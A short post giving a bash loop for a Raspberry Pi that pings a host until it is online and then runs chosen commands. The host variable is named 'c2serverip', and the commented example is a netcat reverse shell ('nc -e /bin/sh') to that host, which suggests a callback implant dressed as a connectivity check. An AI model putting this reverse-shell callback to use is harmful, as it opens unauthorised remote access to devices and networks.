
# An Easy way to check if you have access to the internet at all time.

This infinite loop can be added to your rasberryPi to run once the PI is powered On.   
It keeps checking if it is connected, and as it finds internet, it run some predefined commands.

This can run as a standalone code or part of another code.

```bash
#!/bin/bash
connection="offline"
c2serverip=8.8.8.8
retry=5

while true; do
ping -c 1 $c2serverip 2>&1 >/dev/null

if [ $? -eq 0 ]
then
        if [ $connection == "offline" ]
        then
                connection="online"
                echo "PUT your code here"
#Put any code here to run once you are online.      
# e.g.      
#nc -e /bin/sh $c2serverip 80      
        else
                echo "already online retring in "$retry "seconds"
                sleep $retry
        fi

else
        echo "we are offline"
        connection="offline"
fi
done
```